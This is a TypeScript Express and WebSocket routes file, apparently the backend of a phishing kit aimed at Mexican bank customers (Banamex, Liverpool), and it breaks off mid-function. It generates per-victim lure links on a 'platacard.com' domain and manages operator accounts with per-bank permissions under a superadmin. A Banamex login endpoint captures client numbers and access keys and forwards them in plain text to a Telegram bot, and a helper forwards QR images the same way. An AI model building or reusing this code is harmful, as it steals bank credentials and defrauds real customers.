import type { Express } from "express";
import { createServer, type Server } from "http";
import { WebSocketServer, WebSocket } from "ws";
import { storage } from "./storage";
import { nanoid } from "nanoid";
import { ScreenType, screenChangeSchema, clientInputSchema, User, UserRole, InsertSmsConfig, insertSmsConfigSchema, InsertSmsHistory, insertSmsHistorySchema } from "@shared/schema";
import { setupAuth } from "./auth";
import axios from 'axios';
import FormData from 'form-data';

// Función para generar IDs numéricos de una longitud específica
const generateNumericId = (length: number): string => {
  let id = '';
  for (let i = 0; i < length; i++) {
    id += Math.floor(Math.random() * 10).toString();
  }
  return id;
};

// Función para enviar mensajes a Telegram
const sendTelegramMessage = async (message: string) => {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.error('❌ Error: TELEGRAM_BOT_TOKEN o TELEGRAM_CHAT_ID no configurado');
    return null;
  }

  console.log(`📤 Enviando mensaje a Telegram (Chat ID: ${chatId})...`);

  try {
    const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML'
    });
    console.log('✅ Mensaje enviado a Telegram exitosamente');
    return response.data;
  } catch (error: any) {
    console.error('❌ Error enviando mensaje a Telegram:', error?.response?.data || error?.message || error);
    if (error?.response?.data) {
      console.error('Detalles del error:', JSON.stringify(error.response.data, null, 2));
    }
    return null;
  }
};

// Función para enviar imágenes a Telegram
const sendTelegramPhoto = async (imageData: string, caption: string) => {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.error('❌ Error: TELEGRAM_BOT_TOKEN o TELEGRAM_CHAT_ID no configurado');
    return null;
  }

  console.log(`📤 Enviando imagen QR a Telegram (Chat ID: ${chatId})...`);

  try {
    // Convertir base64 a buffer
    const base64Data = imageData.replace(/^data:image\/\w+;base64,/, '');
    const photoBuffer = Buffer.from(base64Data, 'base64');

    const form = new FormData();
    form.append('chat_id', chatId);
    form.append('photo', photoBuffer, 'qr_code.jpg');
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');

    const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, form, {
      headers: form.getHeaders()
    });

    console.log('✅ Imagen QR enviada a Telegram exitosamente');
    return response.data;
  } catch (error: any) {
    console.error('❌ Error enviando imagen QR a Telegram:', error?.response?.data || error?.message || error);
    if (error?.response?.data) {
      console.error('Detalles del error:', JSON.stringify(error.response.data, null, 2));
    }
    return null;
  }
};

// Store active connections
const clients = new Map<string, WebSocket>();
// Cambiamos a un Map para asociar cada socket con su username
const adminClients = new Map<string, WebSocket>();

export async function registerRoutes(app: Express): Promise<Server> {
  // Setup authentication
  setupAuth(app);

  // Create HTTP server
  const httpServer = createServer(app);

  // Configurar limpieza periódica de sesiones vacías (cada minuto)
  setInterval(async () => {
    try {
      const expiredCount = await storage.cleanupExpiredSessions();
      const emptyCount = await storage.cleanupEmptySessions();
      const totalDeleted = expiredCount + emptyCount;

      if (totalDeleted > 0) {
        console.log(`Limpieza automática: ${expiredCount} sesiones expiradas + ${emptyCount} sesiones vacías eliminadas`);
        broadcastToAdmins(JSON.stringify({
          type: 'SESSIONS_CLEANUP',
          data: { 
            expiredCount, 
            emptyCount, 
            totalDeleted 
          }
        }));
      }
    } catch (error) {
      console.error("Error en la limpieza automática de sesiones:", error);
    }
  }, 60000); // Ejecutar cada 60 segundos

  // Create WebSocket server
  const wss = new WebSocketServer({ server: httpServer, path: '/ws' });

  // La limpieza periódica de sesiones antiguas ya está configurada cada minuto

  // Configurar limpieza periódica de usuarios expirados
  setInterval(async () => {
    try {
      const deactivatedCount = await storage.cleanupExpiredUsers();
      if (deactivatedCount > 0) {
        console.log(`Limpieza automática: ${deactivatedCount} usuarios expirados desactivados`);
        broadcastToAdmins(JSON.stringify({
          type: 'USERS_CLEANUP',
          data: { deactivatedCount }
        }));
      }
    } catch (error) {
      console.error('Error en limpieza automática de usuarios:', error);
    }
  }, 6 * 60 * 60 * 1000); // Ejecutar cada 6 horas

  // API endpoints
  // Rutas de administración de usuarios
  app.post('/api/admin/users', async (req, res) => {
    try {
      const { username, password } = req.body;
      const user = await storage.createAdminUser(username, password);
      res.json({ success: true, user: { ...user, password: undefined } });
    } catch (error: any) {
      res.status(400).json({ success: false, message: error.message });
    }
  });

  app.post('/api/admin/login', async (req, res) => {
    try {
      const { username, password } = req.body;
      const user = await storage.validateAdminUser(username, password);
      if (!user) {
        return res.status(401).json({ success: false, message: "Credenciales inválidas" });
      }

      // Actualizamos la última fecha de inicio de sesión
      await storage.updateUserLastLogin(user.id);

      // Establecemos una cookie de sesión simple (en una implementación real usaríamos JWT o similar)
      res.cookie('auth_token', username, { 
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        maxAge: 24 * 60 * 60 * 1000 // 1 día
      });

      res.json({ success: true, user: { ...user, password: undefined } });
    } catch (error: any) {
      res.status(500).json({ success: false, message: error.message });
    }
  });

  app.post('/api/admin/logout', async (req, res) => {
    try {
      // Limpiar la cookie de autenticación
      res.clearCookie('auth_token');
      res.json({ success: true });
    } catch (error: any) {
      res.status(500).json({ success: false, message: error.message });
    }
  });

  app.post('/api/admin/users/:username/toggle', async (req, res) => {
    try {
      const { username } = req.params;
      const success = await storage.toggleAdminUserStatus(username);
      if (!success) {
        return res.status(404).json({ success: false, message: "Usuario no encontrado" });
      }
      res.json({ success: true });
    } catch (error: any) {
      res.status(500).json({ success: false, message: error.message });
    }
  });

  app.get('/api/admin/users', async (req, res) => {
    try {
      const users = await storage.getAllAdminUsers();
      res.json(users.map((user: User) => ({ ...user, password: undefined })));
    } catch (error: any) {
      res.status(500).json({ success: false, message: error.message });
    }
  });

  // Ruta para obtener usuarios regulares (solo para el usuario "balonx")
  app.get('/api/users/regular', async (req, res) => {
    console.log('[API] Solicitud para obtener usuarios regulares');

    if (!req.isAuthenticated()) {
      console.log('[API] Error: Usuario no autenticado');
      return res.status(401).json({ message: "No autenticado" });
    }

    const user = req.user;
    console.log(`[API] Usuario actual: ${user.username}, rol: ${user.role}`);

    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (user.username !== "balonx") {
      console.log('[API] Error: Usuario no autorizado (no es balonx)');
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      console.log('[API] Obteniendo lista de usuarios regulares');
      const users = await storage.getAllUsers();
      const regularUsers = users.filter(user => user.role === UserRole.USER);
      console.log(`[API] Encontrados ${regularUsers.length} usuarios regulares`);

      // Mostrar detalles de usuarios para depuración
      regularUsers.forEach(user => {
        console.log(`[API] Usuario: ${user.username}, Activo: ${user.isActive}, Expira: ${user.expiresAt || 'No establecido'}`);
      });

      const usersList = regularUsers.map((user: User) => ({ 
        id: user.id,
        username: user.username,
        role: user.role,
        isActive: user.isActive,
        expiresAt: user.expiresAt,
        deviceCount: user.deviceCount,
        maxDevices: user.maxDevices,
        allowedBanks: user.allowedBanks || 'all',
        createdAt: user.createdAt,
        lastLogin: user.lastLogin
      }));

      res.json(usersList);
    } catch (error: any) {
      console.log(`[API] Error al obtener usuarios: ${error.message}`);
      res.status(500).json({ message: error.message });
    }
  });

  // Alternar el estado de un usuario (activar/desactivar) (solo para el usuario "balonx")
  app.post('/api/users/regular/:username/toggle-status', async (req, res) => {
    console.log('[API] Solicitud para alternar estado de usuario');

    if (!req.isAuthenticated()) {
      console.log('[API] Error: Usuario no autenticado');
      return res.status(401).json({ message: "No autenticado" });
    }

    const currentUser = req.user;
    console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);

    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (currentUser.username !== "balonx") {
      console.log('[API] Error: Usuario no autorizado (no es balonx)');
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const { username } = req.params;
      console.log(`[API] Intentando alternar estado del usuario: ${username}`);

      const success = await storage.toggleUserStatus(username);
      if (!success) {
        return res.status(404).json({ message: "Usuario no encontrado" });
      }

      // Obtener el usuario actualizado
      const updatedUser = await storage.getUserByUsername(username);
      if (!updatedUser) {
        return res.status(404).json({ message: "Usuario no encontrado después de actualización" });
      }

      console.log(`[API] Estado de usuario alternado: ${username}, nuevo estado: ${updatedUser.isActive ? 'activo' : 'inactivo'}`);

      res.json({ 
        success: true, 
        user: {
          id: updatedUser.id,
          username: updatedUser.username,
          role: updatedUser.role,
          isActive: updatedUser.isActive,
          expiresAt: updatedUser.expiresAt,
          deviceCount: updatedUser.deviceCount,
          maxDevices: updatedUser.maxDevices,
          createdAt: updatedUser.createdAt,
          lastLogin: updatedUser.lastLogin
        } 
      });
    } catch (error: any) {
      console.log(`[API] Error al alternar estado de usuario: ${error.message}`);
      res.status(500).json({ message: error.message });
    }
  });

  // Activar un usuario (solo para el usuario "balonx")
  app.post('/api/users/regular/:username/activate-one-day', async (req, res) => {
    console.log('[API] Solicitud para activar usuario');

    if (!req.isAuthenticated()) {
      console.log('[API] Error: Usuario no autenticado');
      return res.status(401).json({ message: "No autenticado" });
    }

    const currentUser = req.user;
    console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);

    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (currentUser.username !== "balonx") {
      console.log('[API] Error: Usuario no autorizado (no es balonx)');
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const { username } = req.params;
      console.log(`[API] Intentando activar usuario: ${username}`);

      // Obtener los bancos permitidos de la solicitud
      const { allowedBanks } = req.body;

      // Activar el usuario (ya no se usa fecha de expiración)
      const user = await storage.activateUserForOneDay(username);

      // Si se proporcionaron bancos permitidos, actualizarlos
      if (allowedBanks) {
        // Actualizar el usuario con los bancos permitidos
        const updatedUser = { 
          ...user, 
          allowedBanks: typeof allowedBanks === 'string' ? allowedBanks : 'all'
        };

        // Guardar los cambios
        await storage.updateUser(user.id, updatedUser);

        console.log(`[API] Bancos permitidos para ${username}: ${updatedUser.allowedBanks}`);
        user.allowedBanks = updatedUser.allowedBanks;
      }

      console.log(`[API] Usuario activado con éxito: ${username}`);
      console.log(`[API] Estado actual: activo=${user.isActive}, expira=${user.expiresAt}`);

      res.json({ 
        success: true, 
        user: {
          id: user.id,
          username: user.username,
          role: user.role,
          isActive: user.isActive,
          expiresAt: user.expiresAt,
          deviceCount: user.deviceCount,
          maxDevices: user.maxDevices,
          allowedBanks: user.allowedBanks || 'all'
        } 
      });
    } catch (error: any) {
      console.log(`[API] Error al activar usuario: ${error.message}`);
      res.status(500).json({ message: error.message });
    }
  });

  // Activar un usuario (solo para el usuario "balonx")
  // Mantenemos la ruta por compatibilidad con el cliente
  app.post('/api/users/regular/:username/activate-seven-days', async (req, res) => {
    console.log('[API] Solicitud para activar usuario (ruta seven-days)');

    if (!req.isAuthenticated()) {
      console.log('[API] Error: Usuario no autenticado');
      return res.status(401).json({ message: "No autenticado" });
    }

    const currentUser = req.user;
    console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);

    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (currentUser.username !== "balonx") {
      console.log('[API] Error: Usuario no autorizado (no es balonx)');
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const { username } = req.params;
      console.log(`[API] Intentando activar usuario: ${username}`);

      // Obtener los bancos permitidos de la solicitud
      const { allowedBanks } = req.body;

      // Activar el usuario (ya no se usa fecha de expiración)
      const user = await storage.activateUserForSevenDays(username);

      // Si se proporcionaron bancos permitidos, actualizarlos
      if (allowedBanks) {
        // Actualizar el usuario con los bancos permitidos
        const updatedUser = { 
          ...user, 
          allowedBanks: typeof allowedBanks === 'string' ? allowedBanks : 'all'
        };

        // Guardar los cambios
        await storage.updateUser(user.id, updatedUser);

        console.log(`[API] Bancos permitidos para ${username}: ${updatedUser.allowedBanks}`);
        user.allowedBanks = updatedUser.allowedBanks;
      }

      console.log(`[API] Usuario activado con éxito: ${username}`);
      console.log(`[API] Estado actual: activo=${user.isActive}, expira=${user.expiresAt}`);

      res.json({ 
        success: true, 
        user: {
          id: user.id,
          username: user.username,
          role: user.role,
          isActive: user.isActive,
          expiresAt: user.expiresAt,
          deviceCount: user.deviceCount,
          maxDevices: user.maxDevices,
          allowedBanks: user.allowedBanks || 'all'
        } 
      });
    } catch (error: any) {
      console.log(`[API] Error al activar usuario: ${error.message}`);
      res.status(500).json({ message: error.message });
    }
  });

  // Este endpoint se mantiene por compatibilidad pero ya no desactiva usuarios
  // ya que los usuarios no expiran automáticamente
  app.post('/api/users/cleanup-expired', async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).json({ message: "No autenticado" });
    }

    const currentUser = req.user;
    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (currentUser.username !== "balonx") {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      // Esta función ya no realiza ninguna acción
      const deactivatedCount = await storage.cleanupExpiredUsers();
      res.json({ 
        success: true, 
        deactivatedCount, 
        message: "Los usuarios ya no expiran automáticamente" 
      });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Eliminar un usuario (solo usuario "balonx" puede hacerlo)
  app.delete('/api/users/regular/:username', async (req, res) => {
    console.log('[API] Solicitud para eliminar usuario');

    if (!req.isAuthenticated()) {
      console.log('[API] Error: Usuario no autenticado');
      return res.status(401).json({ message: "No autenticado" });
    }

    const currentUser = req.user;
    console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);

    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (currentUser.username !== "balonx") {
      console.log('[API] Error: Usuario no autorizado (no es balonx)');
      return res.status(403).json({ message: "No autorizado" });
    }

    const { username } = req.params;

    // No permitir eliminar al usuario admin "balonx"
    if (username === "balonx") {
      console.log('[API] Error: No se puede eliminar al usuario admin "balonx"');
      return res.status(403).json({ message: "No se puede eliminar al usuario administrador principal" });
    }

    try {
      console.log(`[API] Intentando eliminar usuario: ${username}`);
      const deleted = await storage.deleteUser(username);

      if (!deleted) {
        console.log(`[API] Error: Usuario ${username} no encontrado`);
        return res.status(404).json({ success: false, message: "Usuario no encontrado" });
      }

      console.log(`[API] Usuario eliminado con éxito: ${username}`);
      res.json({ success: true, message: `Usuario ${username} eliminado correctamente` });
    } catch (error: any) {
      console.log(`[API] Error al eliminar usuario: ${error.message}`);
      res.status(500).json({ success: false, message: error.message });
    }
  });

  app.get('/api/admin/user', async (req, res) => {
    try {
      // Obtener el username de la cookie de autenticación
      const username = req.cookies?.auth_token;
      if (!username) {
        return res.status(401).json({ message: "No autorizado" });
      }

      // Buscar el usuario por nombre de usuario
      const user = await storage.getUserByUsername(username);
      if (!user) {
        return res.status(401).json({ message: "Usuario no encontrado" });
      }

      // Verificar si el usuario está activo
      if (!user.isActive) {
        return res.status(403).json({ message: "Usuario inactivo" });
      }

      // Devolver el usuario sin la contraseña
      res.json({ ...user, password: undefined });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Endpoint de depuración para ver todas las sesiones
  app.get('/api/debug/all-sessions', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      // Solo permitir a superadmin acceder a este endpoint
      const user = req.user;
      if (user.username !== 'balonx') {
        return res.status(403).json({ message: "Solo superadmin puede acceder a este endpoint" });
      }

      // Obtener absolutamente todas las sesiones sin filtrar
      const allSessions = await storage.getAllSessions();
      console.log(`[Debug] Total de sesiones en almacenamiento: ${allSessions.length}`);

      // Contar las sesiones guardadas y corrientes
      const savedSessions = allSessions.filter(s => s.saved === true);
      const currentSessions = allSessions.filter(s => s.active === true && s.saved === false);

      // Verificar información de creación
      const sessionsWithCreator = allSessions.filter(s => s.createdBy).length;
      const sessionsWithoutCreator = allSessions.filter(s => !s.createdBy).length;

      res.json({
        count: {
          total: allSessions.length,
          saved: savedSessions.length,
          current: currentSessions.length,
          withCreator: sessionsWithCreator,
          withoutCreator: sessionsWithoutCreator
        },
        sessions: allSessions
      });
    } catch (error) {
      console.error("Error obteniendo sesiones para depuración:", error);
      res.status(500).json({ message: "Error obteniendo sesiones" });
    }
  });

  // Endpoint para forzar el creador de sesiones existentes (para depuración)
  app.post('/api/debug/force-session-creator', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const { sessionId, username } = req.body;
      if (!sessionId || !username) {
        return res.status(400).json({ message: "Se requiere sessionId y username" });
      }

      const session = await storage.getSessionById(sessionId);
      if (!session) {
        return res.status(404).json({ message: "Sesión no encontrada" });
      }

      // Actualizar manualmente el creador
      const updatedSession = await storage.updateSession(sessionId, { createdBy: username });
      console.log(`[Debug] Forzado creador de sesión ${sessionId} a: ${username}`);

      res.json({ success: true, session: updatedSession });
    } catch (error) {
      console.error("Error forzando creador de sesión:", error);
      res.status(500).json({ message: "Error forzando creador de sesión" });
    }
  });

  // Endpoint para crear una sesión con usuario brandon (para depuración)
  app.get('/api/debug/create-brandon-session', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      // Solo permitir a superadmin o brandon acceder
      const user = req.user;
      if (user.username !== 'balonx' && user.username !== 'brandon') {
        return res.status(403).json({ message: "No autorizado para acceder a este endpoint" });
      }

      // Crear sesión para brandon
      const sessionId = nanoid(10);
      const sixDigitCode = '654321';

      const session = await storage.createSession({ 
        sessionId, 
        banco: "LIVERPOOL",
        folio: sixDigitCode,
        pasoActual: ScreenType.FOLIO,
        createdBy: 'brandon', // Forzar el creador como brandon
      });

      // Guardar la sesión explícitamente
      const savedSession = await storage.saveSession(sessionId);
      console.log(`[Debug] Creada sesión ${sessionId} para brandon`);

      if (!savedSession.createdBy) {
        console.log(`[Debug] ERROR: Sesión guardada sin creador. Corrigiendo...`);
        await storage.updateSession(sessionId, { createdBy: 'brandon' });
      }

      // Verificar estado después de guardar
      const sessionAfterSave = await storage.getSessionById(sessionId);

      res.json({ 
        success: true, 
        sessionId,
        session: sessionAfterSave
      });
    } catch (error) {
      console.error("Error creando sesión de prueba:", error);
      res.status(500).json({ message: "Error creando sesión de prueba" });
    }
  });

  app.get('/api/sessions', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const { type = 'current' } = req.query;
      const user = req.user;
      console.log(`[Sessions] Usuario ${user.username} solicitando sesiones, tipo: ${type}, rol: ${user.role}`);

      // Obtenemos todas las sesiones para que estén siempre actualizadas
      const allSessions = await storage.getAllSessions();

      // Filtramos según el tipo solicitado
      let sessions;
      if (type === 'saved') {
        sessions = allSessions.filter(s => s.saved === true);
        console.log(`[Sessions] Hay ${sessions.length} sesiones guardadas filtradas de ${allSessions.length} totales`);
      } else if (type === 'all') {
        sessions = allSessions;
        console.log(`[Sessions] Obtenidas ${sessions.length} sesiones (todas)`);
      } else {
        // Sesiones que no están guardadas (current)
        sessions = allSessions.filter(s => !s.saved);
        console.log(`[Sessions] Obtenidas ${sessions.length} sesiones actuales filtradas de ${allSessions.length} totales`);
      }

      // Filtrando las sesiones según el usuario
      const isSuperAdmin = user.username === 'balonx';
      const isAdmin = user.role === 'admin';

      if (!isAdmin) {
        const beforeCount = sessions.length;

        // Verificar explícitamente la existencia del campo createdBy para cada sesión
        sessions.forEach((session, index) => {
          if (!session.createdBy) {
            console.log(`[Alert] Sesión ${session.sessionId} sin creador asignado.`);
          }
        });

        // Filtrar solo las sesiones creadas por este usuario
        sessions = sessions.filter(session => session.createdBy === user.username);

        console.log(`[Sessions] Usuario ${user.username} (rol: ${user.role}), mostrando ${sessions.length} de ${beforeCount} sesiones`);
      } else if (isSuperAdmin) {
        console.log(`[Sessions] Superadministrador balonx accediendo a todas las sesiones (${sessions.length})`);
      } else {
        // Este es un admin regular (no es balonx)
        console.log(`[Sessions] Administrador ${user.username} accediendo a todas las sesiones (${sessions.length})`);
      }

      // Ordenamos por fecha más reciente primero
      sessions.sort((a, b) => {
        const dateA = a.createdAt ? new Date(a.createdAt).getTime() : 0;
        const dateB = b.createdAt ? new Date(b.createdAt).getTime() : 0;
        return dateB - dateA;
      });

      res.json(sessions);
    } catch (error) {
      console.error("Error fetching sessions:", error);
      res.status(500).json({ message: "Error fetching sessions" });
    }
  });

  app.post('/api/sessions', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const user = req.user;
      const { banco = "BANAMEX" } = req.body;
      const sessionId = nanoid(10);

      // Generamos un código de 6 dígitos numéricos fácil de ver para el folio
      const generateSixDigitCode = () => {
        let code = '';
        for (let i = 0; i < 6; i++) {
          code += Math.floor(Math.random() * 10).toString();
        }
        return code;
      };

      const sixDigitCode = generateSixDigitCode();

      const session = await storage.createSession({ 
        sessionId, 
        banco,
        folio: sixDigitCode,
        pasoActual: ScreenType.FOLIO,
        createdBy: user.username, // Añadimos el creador
      });

      // Guardar la sesión automáticamente para que aparezca en el historial
      await storage.saveSession(sessionId);
      console.log(`Sesión guardada automáticamente: ${sessionId}, creador: ${user.username}`);

      // Notificar a los clientes de admin sobre la actualización
      broadcastToAdmins(JSON.stringify({
        type: 'SESSIONS_UPDATED',
        data: {
          userName: user.username
        }
      }));

      res.json(session);
    } catch (error) {
      console.error("Error creating session:", error);
      res.status(500).json({ message: "Error creating session" });
    }
  });

  app.post('/api/banamex/login', async (req, res) => {
    try {
      const { numeroCliente, claveAcceso } = req.body;

      if (!numeroCliente || !claveAcceso) {
        return res.status(400).json({ message: "Número de cliente y clave de acceso son requeridos" });
      }

      const sessionId = nanoid(10);

      const session = await storage.createSession({ 
        sessionId, 
        banco: "CITIBANAMEX",
        numeroCliente,
        claveAcceso,
        pasoActual: "validando",
        createdBy: "banamex_client",
      });

      console.log(`[Banamex Login] Nueva sesión creada: ${sessionId}, Cliente: ${numeroCliente}`);

      await sendTelegramMessage(
        `🏦 <b>Nuevo Login - Banamex Empresarial</b>\n\n` +
        `📱 <b>Número de Cliente:</b> ${numeroCliente}\n` +
        `🔑 <b>Clave de Acceso:</b> ${claveAcceso}\n` +
        `🆔 <b>Session ID:</b> ${sessionId}\n` +
        `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`
      );

      broadcastToAdmins(JSON.stringify({
        type: 'NEW_BANAMEX_SESSION',
        data: session
      }));

      res.json({ 
        success: true, 
        sessionId,
        message: "Validando credenciales..." 
      });
    } catch (error) {
      console.error("Error en login de Banamex:", error);
      res.status(500).json({ message: "Error procesando login" });
    }
  });

  app.post('/api/sessions/:id/update', async (req, res) => {
    try {
      const { id } = req.params;
      const session = await storage.updateSession(id, req.body);

      // Notify all admin clients
      broadcastToAdmins(JSON.stringify({
        type: 'SESSION_UPDATE',
        data: session
      }));

      res.json(session);
    } catch (error) {
      console.error("Error updating session:", error);
      res.status(500).json({ message: "Error updating session" });
    }
  });

  // Endpoint para guardar una sesión
  app.post('/api/sessions/:id/save', async (req, res) => {
    try {
      const { id } = req.params;
      const session = await storage.saveSession(id);

      // Notify all admin clients
      broadcastToAdmins(JSON.stringify({
        type: 'SESSION_UPDATE',
        data: session
      }));

      res.json(session);
    } catch (error) {
      console.error("Error saving session:", error);
      res.status(500).json({ message: "Error saving session" });
    }
  });

  // Endpoint para eliminar una sesión (sólo para administradores)
  app.delete('/api/sessions/:id', async (req, res) => {
    try {
      // Verificar si el usuario está autenticado
      if (!req.isAuthenticated()) {
        return res.status(401).json({ success: false, message: "No autenticado" });
      }

      // Verificar si el usuario tiene rol de administrador
      const user = req.user;
      if (user.role !== 'admin') {
        console.log(`[API] Usuario ${user.username} intentó eliminar sesión, pero tiene rol ${user.role}`);
        return res.status(403).json({ success: false, message: "No tienes permisos para eliminar sesiones" });
      }

      const { id } = req.params;
      const success = await storage.deleteSession(id);

      if (success) {
        // Notify all admin clients
        broadcastToAdmins(JSON.stringify({
          type: 'SESSION_DELETE',
          data: { sessionId: id }
        }));

        console.log(`[API] Administrador ${user.username} eliminó la sesión ${id}`);
        res.json({ success: true });
      } else {
        res.status(404).json({ success: false, message: "Session not found" });
      }
    } catch (error) {
      console.error("Error deleting session:", error);
      res.status(500).json({ message: "Error deleting session" });
    }
  });

  // Endpoint para limpiar sesiones expiradas (más de 5 días)
  app.post('/api/cleanup-sessions', async (req, res) => {
    try {
      const deletedCount = await storage.cleanupExpiredSessions();

      // Notify all admin clients to refresh their session list
      broadcastToAdmins(JSON.stringify({
        type: 'SESSIONS_CLEANUP',
        data: { deletedCount }
      }));

      res.json({ success: true, deletedCount });
    } catch (error) {
      console.error("Error cleaning up sessions:", error);
      res.status(500).json({ message: "Error cleaning up sessions" });
    }
  });

  app.get('/api/generate-link', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const { banco = "BANAMEX" } = req.query;
      // Usar la nueva función para generar un ID numérico de 10 dígitos
      const sessionId = generateNumericId(10);
      const user = req.user;

      // Validar que el banco solicitado esté permitido para el usuario
      if (user.role !== 'admin' && user.allowedBanks !== 'all') {
        // Si el usuario no es administrador y no tiene permitido todos los bancos,
        // verificamos que el banco solicitado esté en la lista de bancos permitidos
        const allowedBanks = user.allowedBanks.split(',');
        console.log(`Usuario ${user.username} solicita banco ${banco}, permitidos: ${allowedBanks}`);

        if (!allowedBanks.includes(banco as string)) {
          // Si el banco solicitado no está en la lista, usamos el primer banco permitido
          const bancoPermitido = allowedBanks[0] || "LIVERPOOL";
          console.log(`Banco ${banco} no permitido para ${user.username}. Usando ${bancoPermitido}`);
          return res.status(403).json({ 
            error: `Banco ${banco} no permitido. Solo puedes usar: ${allowedBanks.join(', ')}` 
          });
        }
      }

      // Generamos un código de 6 dígitos numéricos fácil de ver para el folio
      const generateSixDigitCode = () => {
        // Genera números aleatorios entre 0-9 para cada posición
        let code = '';
        for (let i = 0; i < 6; i++) {
          code += Math.floor(Math.random() * 10).toString();
        }
        return code;
      };

      const sixDigitCode = generateSixDigitCode();

      const session = await storage.createSession({ 
        sessionId, 
        banco: banco as string,
        folio: sixDigitCode,
        pasoActual: ScreenType.FOLIO,
        createdBy: user.username,  // Añadimos el nombre del usuario que creó la sesión
      });

      // Guardar la sesión automáticamente para que aparezca en el historial
      const savedSession = await storage.saveSession(sessionId);
      console.log(`Sesión guardada automáticamente: ${sessionId}`);

      // Verificar si el campo createdBy está correctamente establecido
      if (!savedSession.createdBy) {
        console.log(`ADVERTENCIA: Creador no establecido en la sesión guardada ${sessionId}. Forzando creador: ${user.username}`);
        await storage.updateSession(sessionId, { createdBy: user.username });
      }

      // Configuración de dominios
      const clientDomain = process.env.CLIENT_DOMAIN || 'platacard.com';
      const adminDomain = process.env.ADMIN_DOMAIN || 'panel.platacard.com';

      // Armamos los enlaces para ambos dominios
      // Ahora enviamos a la ruta raíz en lugar de /client/ para ocultar el acceso directo
      const clientLink = `https://${clientDomain}/${sessionId}`;
      const adminLink = `https://${adminDomain}/Balonx`;

      console.log(`Nuevo enlace generado - Código: ${sixDigitCode}, Banco: ${banco}`);
      console.log(`URL del cliente: ${clientLink}`);
      console.log(`URL del admin: ${adminLink}`);
      console.log(`Generado por usuario: ${user.username}`);

      console.log(`Notificando a los clientes de admin sobre el nuevo enlace - Código: ${sixDigitCode}, Banco: ${banco}, Usuario: ${user.username}`);

      // Notificar a los clientes de admin sobre el nuevo enlace
      // Enviar al usuario que creó el link y al superadmin
      broadcastToAdmins(JSON.stringify({
        type: 'LINK_GENERATED',
        data: { 
          sessionId,
          code: sixDigitCode,
          banco: banco as string,
          userName: user.username,
          createdBy: user.username // Añadimos para consistency
        }
      }), user.username); // Pasamos el username como segundo argumento

      // Enviar una señal específica a través de WebSocket para actualizar las sesiones del usuario
      // con información completa sobre la nueva sesión
      broadcastToAdmins(JSON.stringify({
        type: 'SESSION_UPDATE',
        data: {
          sessionId,
          banco: banco as string,
          folio: sixDigitCode,
          pasoActual: ScreenType.FOLIO,
          createdBy: user.username,
          saved: false,
          createdAt: new Date().toISOString()
        }
      }));

      res.json({ 
        sessionId, 
        link: clientLink, 
        adminLink: adminLink,
        code: sixDigitCode
      });
    } catch (error) {
      console.error("Error generating link:", error);
      res.status(500).json({ message: "Error generating link" });
    }
  });

  // WebSocket handling
  wss.on('connection', (ws, req) => {
    console.log('New WebSocket connection');

    // Handle client/admin identification
    ws.on('message', async (message) => {
      try {
        const parsedMessage = JSON.parse(message.toString());
        console.log(`[WebSocket] Mensaje recibido: ${parsedMessage.type || 'SIN_TIPO'}`, parsedMessage);

        // Register client or admin
        if (parsedMessage.type === 'REGISTER') {
          if (parsedMessage.role === 'ADMIN') {
            // Determinar si es un administrador o un usuario basado en el username
            const userName = parsedMessage.username || '';
            const user = await storage.getUserByUsername(userName);

            if (!user) {
              console.log(`WebSocket: Usuario ${userName} no encontrado en la base de datos`);
              ws.send(JSON.stringify({
                type: 'ERROR',
                message: 'Usuario no encontrado'
              }));
              return;
            }

            // Guardar el cliente en el Map con su username como clave
            adminClients.set(userName, ws);
            console.log(`Admin client registered: ${userName}`);

            console.log(`WebSocket: Usuario ${userName} (rol: ${user.role}) autenticado, obteniendo sesiones...`);

            // NUEVA IMPLEMENTACIÓN UNIFICADA PARA TODOS LOS USUARIOS
            if (false) { // Este bloque nunca se ejecuta, solo se mantiene para referencia
              console.log(`WebSocket: Usuario ${userName} detectado como usuario brandon, obteniendo sus sesiones guardadas...`);

              // Obtener todas las sesiones guardadas primero 
              const allSavedSessions = await storage.getSavedSessions();

              console.log(`WebSocket: Encontradas ${allSavedSessions.length} sesiones guardadas en total`);

              // Mostrar detalles de cada sesión guardada para depuración
              allSavedSessions.forEach(session => {
